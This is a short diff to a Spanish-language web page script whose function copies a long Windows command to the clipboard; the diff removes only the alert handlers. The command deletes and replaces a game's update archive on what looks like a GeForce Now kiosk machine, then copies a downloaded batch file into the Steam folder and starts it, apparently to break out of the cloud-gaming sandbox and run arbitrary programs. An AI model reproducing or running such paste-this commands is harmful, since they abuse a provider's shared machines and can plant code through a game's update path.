@@ -99,13 +99,8 @@ function copiarAlPortapapeles() {
   var textoACopiar = "del \"C:\\Program Files (x86)\\NVIDiA_Grid_Bundle\\crossout_gfn_pc\\common\\Crossout\\update\\latest.zip\"&copy \"C:\\users\\kiosk\\downloads\\latest.zip\" \"C:\\Program Files (x86)\\NViDiA_Grid_Bundle\\crossout_gfn_pc\\common\\Crossout\\update\"& echo \"C:\\Program Files (x86)\\NViDiA_Grid_Bundle\\crossout_gfn_pc\\common\\Crossout\\a.exe\" | clip & copy \"C:\\users\\kiosk\\downloads\\Stella.bat\" \"C:\\Program Files (x86)\\steam\\ssfn_stella.bat\"&start \"\" \"C:\\Program Files (x86)\\steam\\ssfn_stella.bat\"";
 
   navigator.clipboard.writeText(textoACopiar)
-    .then(() => {
-      alert("Texto copiado al portapapeles con éxito.");
-    })
-    .catch(err => {
-      console.error("Error al copiar:", err);
-      alert("No se pudo copiar el texto. Verifique los permisos del navegador.");
-    });
+   
+    
 }
 </script>
 
